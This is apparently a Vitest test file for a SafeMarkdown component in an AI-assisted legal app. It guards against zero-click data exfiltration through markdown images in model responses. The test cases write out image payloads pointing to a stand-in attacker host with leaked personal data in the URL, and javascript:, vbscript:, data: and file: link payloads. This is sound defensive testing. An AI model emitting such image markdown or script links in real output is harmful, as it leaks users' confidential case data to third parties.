// Audyt 2026-09, A-20: obraz markdown w odpowiedzi modelu = zero-click
// eksfiltracja danych sprawy. Ten plik pilnuje trzech rzeczy:
// 1. modulu SafeMarkdown (obrazy, linki, surowy HTML),
// 2. MIANOWNIKA: zaden plik w src poza SafeMarkdown.tsx nie importuje
//    react-markdown i nikt nie importuje rehype-raw - nowe miejsce renderu
//    markdown nie moze ominac bramki po cichu (lekcja z no-relative-api.test.ts),
// 3. ze znane miejsca renderu faktycznie uzywaja SafeMarkdown.
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join, sep } from "node:path";
import { render } from "@testing-library/react";
import remarkGfm from "remark-gfm";
import { describe, expect, it, vi } from "vitest";
import { t } from "@/i18n";
import {
    SafeMarkdown,
    safeHref,
    safeUrlTransform,
    urlScheme,
    type SafeMarkdownComponents,
} from "./SafeMarkdown";

vi.setConfig({ testTimeout: 60_000 });

const LEAK = "Jan%20Testowy%2044051401458";

function md(text: string, components?: SafeMarkdownComponents) {
    return render(<SafeMarkdown components={components}>{text}</SafeMarkdown>);
}

describe("SafeMarkdown - obrazy nigdy nie tworza <img>", () => {
    const cases: Array<[string, string]> = [
        ["inline https", `![logo](https://atakujacy.example/p.png?d=${LEAK})`],
        ["reference-style", `![a][r]\n\n[r]: https://atakujacy.example/r.gif?d=${LEAK}`],
        ["protocol-relative", `![a](//atakujacy.example/x.gif?d=${LEAK})`],
        ["http", `![a](http://atakujacy.example/x.gif?d=${LEAK})`],
        ["wzgledny", "![a](/api/x.png)"],
        ["data:image", "![a](data:image/png;base64,iVBORw0KGgo=)"],
        ["blob:", "![a](blob:http://localhost:3000/abc)"],
        ["obraz w linku", `[![a](https://atakujacy.example/i.gif?d=${LEAK})](https://example.org)`],
        ["surowy HTML", `<img src="https://atakujacy.example/h.gif?d=${LEAK}">`],
    ];
    for (const [name, text] of cases) {
        it(`${name}: brak <img> i brak adresu w DOM`, () => {
            const { container } = md(text);
            expect(container.querySelectorAll("img")).toHaveLength(0);
            // Zaden atrybut nie niesie adresu atakujacego (src, srcset, href na obrazie).
            for (const el of Array.from(container.querySelectorAll("*"))) {
                for (const attr of Array.from(el.attributes)) {
                    if (attr.name === "href") continue; // link wymaga klikniecia
                    expect(attr.value).not.toContain("atakujacy.example");
                }
            }
        });
    }

    it("zablokowany obraz pokazuje tekst alt i nieaktywna informacje", () => {
        const { container } = md(`![Logo kancelarii](https://atakujacy.example/l.png?d=${LEAK})`);
        const blocked = container.querySelector("[data-markdown-image-blocked]");
        expect(blocked).not.toBeNull();
        expect(blocked?.textContent).toContain("Logo kancelarii");
        expect(blocked?.textContent).toContain(t("safeMarkdown.imageBlocked"));
        expect(blocked?.closest("a")).toBeNull();
    });

    it("komponent img wywolujacego nie moze obejsc blokady", () => {
        const sneaky = {
            img: (p: { src?: string }) => <img src={p.src} alt="" />,
        } as unknown as SafeMarkdownComponents;
        const { container } = md(`![a](https://atakujacy.example/s.gif?d=${LEAK})`, sneaky);
        expect(container.querySelectorAll("img")).toHaveLength(0);
    });
});

describe("SafeMarkdown - linki", () => {
    it("http(s): rel=noopener noreferrer i target=_blank", () => {
        const { container } = md("[strona](https://example.org/a)");
        const a = container.querySelector("a");
        expect(a?.getAttribute("href")).toBe("https://example.org/a");
        expect(a?.getAttribute("rel")).toBe("noopener noreferrer");
        expect(a?.getAttribute("target")).toBe("_blank");
    });

    it("mailto: dozwolony, bez nowego okna", () => {
        const { container } = md("[mail](mailto:biuro@example.org)");
        const a = container.querySelector("a");
        expect(a?.getAttribute("href")).toBe("mailto:biuro@example.org");
        expect(a?.getAttribute("rel")).toBe("noopener noreferrer");
        expect(a?.hasAttribute("target")).toBe(false);
    });

    for (const href of [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "data:text/html;base64,PHNjcmlwdD4=",
        "vbscript:msgbox(1)",
        "file:///C:/akta/umowa.docx",
    ]) {
        it(`${href.split(":")[0]}: nie tworzy aktywnego <a>`, () => {
            const { container } = md(`[kliknij](${href})`);
            expect(container.querySelector("a")).toBeNull();
            const blocked = container.querySelector("[data-markdown-link-blocked]");
            expect(blocked?.textContent).toBe("kliknij");
        });
    }

    it("linkClassName stylizuje link", () => {
        const { container } = render(
            <SafeMarkdown linkClassName="text-bordeaux">{"[x](https://example.org)"}</SafeMarkdown>,
        );
        expect(container.querySelector("a")?.className).toBe("text-bordeaux");
    });

    it("kotwica przypisu GFM zostaje w tym samym oknie", () => {
        const { container } = render(
            <SafeMarkdown remarkPlugins={[remarkGfm]}>{"Tekst[^1]\n\n[^1]: Przypis"}</SafeMarkdown>,
        );
        const ref = container.querySelector("a[data-footnote-ref]");
        expect(ref?.getAttribute("href")).toMatch(/^#/);
        expect(ref?.hasAttribute("target")).toBe(false);
    });
});

describe("safeHref / urlScheme / safeUrlTransform", () => {
    it("schemat liczony jak w przegladarce (tab/LF/CR i spacje wiodace)", () => {
        expect(urlScheme("java\nscript:alert(1)")).toBe("javascript");
        expect(urlScheme(" \tjavascript:alert(1)")).toBe("javascript");
        expect(urlScheme("/a:b")).toBeNull();
        expect(urlScheme("?a:b")).toBeNull();
        expect(urlScheme("#a:b")).toBeNull();
        expect(urlScheme("//host/x")).toBeNull();
    });

    it("safeHref: tylko http/https/mailto i adresy bez schematu", () => {
        expect(safeHref("https://a.example")).toBe("https://a.example");
        expect(safeHref("HTTP://a.example")).toBe("HTTP://a.example");
        expect(safeHref("mailto:x@a.example")).toBe("mailto:x@a.example");
        expect(safeHref("#przypis")).toBe("#przypis");
        expect(safeHref("java\tscript:alert(1)")).toBeUndefined();
        expect(safeHref("data:text/html,x")).toBeUndefined();
        expect(safeHref("")).toBeUndefined();
        expect(safeHref(undefined)).toBeUndefined();
    });

    it("safeUrlTransform: src i inne atrybuty URL zawsze usuwane", () => {
        type Node = Parameters<typeof safeUrlTransform>[2];
        const el = (tagName: string): Node => ({
            type: "element",
            tagName,
            properties: {},
            children: [],
        });
        const img = el("img");
        const a = el("a");
        const q = el("blockquote");
        expect(safeUrlTransform("data:image/png;base64,AA", "src", img)).toBeUndefined();
        expect(safeUrlTransform("https://a.example", "src", img)).toBeUndefined();
        expect(safeUrlTransform("https://a.example", "cite", q)).toBeUndefined();
        expect(safeUrlTransform("https://a.example", "href", a)).toBe("https://a.example");
    });
});

// ---------------------------------------------------------------------------
// Bramka mianownika
// ---------------------------------------------------------------------------

const SRC_DIR = join(__dirname, "..", "..");
const SAFE_MODULE = "lib/markdown/SafeMarkdown.tsx";

function walk(dir: string, out: string[] = []): string[] {
    for (const name of readdirSync(dir)) {
        if (name === "node_modules" || name.startsWith(".")) continue;
        const full = join(dir, name);
        if (statSync(full).isDirectory()) walk(full, out);
        else if (/\.(ts|tsx|js|jsx|mjs|cjs)$/.test(name)) out.push(full);
    }
    return out;
}

function rel(full: string): string {
    return full.slice(SRC_DIR.length + 1).split(sep).join("/");
}

const IMPORTS_REACT_MARKDOWN = /(?:from\s+|import\s*\(\s*|require\s*\(\s*)["']react-markdown["']/;
const IMPORTS_REHYPE_RAW = /["']rehype-raw["']/;

describe("SafeMarkdown - mianownik (kazdy render markdown przechodzi przez modul)", () => {
    const files = walk(SRC_DIR).filter((f) => !/\.test\.(ts|tsx)$/.test(f));
    const sources = new Map(files.map((f) => [rel(f), readFileSync(f, "utf8")]));

    it("skan obejmuje cale src (app/, components/, lib/) a nie wycinek", () => {
        const paths = [...sources.keys()];
        expect(paths).toContain(SAFE_MODULE);
        expect(paths.some((p) => p.startsWith("app/"))).toBe(true);
        expect(paths.some((p) => p.startsWith("components/"))).toBe(true);
        expect(paths.length).toBeGreaterThan(100);
    });

    it("tylko SafeMarkdown.tsx importuje react-markdown", () => {
        const offenders = [...sources.entries()]
            .filter(([p, s]) => p !== SAFE_MODULE && IMPORTS_REACT_MARKDOWN.test(s))
            .map(([p]) => p);
        expect(offenders).toEqual([]);
        // Kontrola pozytywna wzorca: modul sam go spelnia.
        expect(IMPORTS_REACT_MARKDOWN.test(sources.get(SAFE_MODULE) ?? "")).toBe(true);
    });

    it("nikt nie importuje rehype-raw (surowy HTML z odpowiedzi modelu)", () => {
        const offenders = [...sources.entries()]
            .filter(([, s]) => IMPORTS_REHYPE_RAW.test(s))
            .map(([p]) => p);
        expect(offenders).toEqual([]);
    });

    it("znane miejsca renderu markdown uzywaja SafeMarkdown", () => {
        const expected = [
            "app/components/assistant/AssistantMessage.tsx",
            "app/components/assistant/AssistantWorkflowModal.tsx",
            "app/components/assistant/DraftRefinePanel.tsx",
            "app/components/tabular/TRChatPanel.tsx",
            "app/components/tabular/TRSidePanel.tsx",
            "app/components/tabular/TabularCell.tsx",
            "app/components/workflows/DisplayWorkflowModal.tsx",
            "app/components/workflows/WFColumnViewModal.tsx",
        ];
        const users = [...sources.entries()]
            .filter(([p, s]) => p !== SAFE_MODULE && /<SafeMarkdown\b/.test(s))
            .map(([p]) => p)
            .sort();
        expect(users).toEqual(expected);
    });
});
